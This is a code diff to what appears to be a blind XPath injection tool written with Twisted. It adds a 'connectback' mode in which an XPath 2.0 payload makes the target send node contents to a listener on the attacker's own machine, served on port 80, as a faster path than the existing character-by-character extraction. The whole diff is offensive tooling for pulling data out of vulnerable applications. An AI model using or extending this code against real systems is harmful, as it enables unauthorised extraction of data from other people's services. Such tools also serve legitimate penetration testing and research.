@@ -3,8 +3,11 @@
 import argparse
 from twisted.internet import reactor, defer
 from lib import SimpleXMLWriter, payloads
-import string
+from twisted.web import server, resource
+from twisted.python import failure
 import sys
+import hashlib
+import time
 __VERSION__ = 0.5
 
 writer = SimpleXMLWriter.XMLWriter(sys.stdout)
@@ -62,38 +65,77 @@ def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
             defer.returnValue(MIN+results.index(True))
 
 
+class DocRequestHandler(resource.Resource):
+    isLeaf = True
+
+    def __init__(self):
+        resource.Resource.__init__(self)
+        self.ids = {}
+
+    def AddConnection(self):
+        id = hashlib.md5(str(time.time())).hexdigest()
+        self.ids[id] = None
+        return id
+
+    def GetResult(self, id):
+        return self.ids.get(id,None)
+
+    def render_GET(self, request):
+        if all([request.args.get("q",None), request.args.get("id",None)]):
+            id = request.args.get("id")[0]
+            d  = request.args.get("q")[0]
+            if id not in self.ids:
+                return sys.stderr.write("Error: query ID %s does not exist"%id)
+            self.ids[id] = d
+
+        return "<emptynode></emptynode>"
+
+
+class DocServerHandler(server.Site):
+    def log(self, *args, **kwargs):
+        return # Do nothing
+
+
 @defer.inlineCallbacks
 def GetCharacters(payloads, node, size=0, count_it=False):
-    if count_it:
+    global args
+    if count_it and not args.connectback:
         size = yield Count(payloads, node=node, count_type=CountTypes.STRING)
         #raw_input("\nGot size %s for node %s"%(size, node))
 
-    returner = []
-    _counter = 0
-    while True:
-        _counter+=1
-        if not size == 0:
-            if _counter > size:
+    if args.connectback:
+        global rhandler
+        id = rhandler.AddConnection()
+        yield payloads.RunQuery(payloads.Get("HTTP_TRANSFER")(node=node, id=id, host=args.connectback_ip))
+        info = rhandler.GetResult(id)
+        defer.returnValue(info or "")
+    else:
+        returner = []
+        _counter = 0
+        while True:
+            _counter+=1
+            if not size == 0:
+                if _counter > size:
+                    break
+
+            _found = False
+            if args.xversion == "1":
+                for char in (payloads.GetSearchSpace()):
+                    r = yield payloads.RunQuery(payloads.Get("GET_NODE_SUBSTRING")(node=node, count=_counter, character=char))
+                    if r:
+                        returner.append(char)
+                        _found = True
+            else:
+                r = yield Count(payloads, node, count_type=CountTypes.CODEPOINT, _codepoint_count=_counter)
+                #raw_input("GetCharacters: r = %s"%r)
+                if r:
+                    returner.append(chr(r))
+                    _found = True
+
+            if not _found:
                 break
 
-        _found = False
-        if args.xversion == "1":
-            for char in (payloads.GetSearchSpace()):
-                r = yield payloads.RunQuery(payloads.Get("GET_NODE_SUBSTRING")(node=node, count=_counter, character=char))
-                if r:
-                    returner.append(char)
-                    _found = True
-        else:
-            r = yield Count(payloads, node, count_type=CountTypes.CODEPOINT, _codepoint_count=_counter)
-            #raw_input("GetCharacters: r = %s"%r)
-            if r:
-                returner.append(chr(r))
-                _found = True
-
-        if not _found:
-            break
-
-    defer.returnValue("".join(returner))
+        defer.returnValue("".join(returner))
 
 @defer.inlineCallbacks
 def GetXMLFromDefinedQuery(payloads, node):
@@ -155,6 +197,10 @@ def Main(args):
 
     if args.error_keyword and args.xversion == "1":
         sys.stderr.write("Error based detection is unavailable when attacking targets running XPath 1.0\n")
+        sys.exit(1)
+
+    if args.connectback and args.xversion == "1":
+        sys.stderr.write("Connectback is only supported with XPath 2.0")
         sys.exit(1)
 
     if args.connectback and not args.connectback_ip:
@@ -241,6 +287,11 @@ if __name__ == "__main__":
         args.lookup = True
     else:
         args.lookup = False
+
+    rhandler = DocRequestHandler()
+    site = DocServerHandler(rhandler)
+    if args.connectback:
+        reactor.listenTCP(80, site)
 
     Main(args)
 
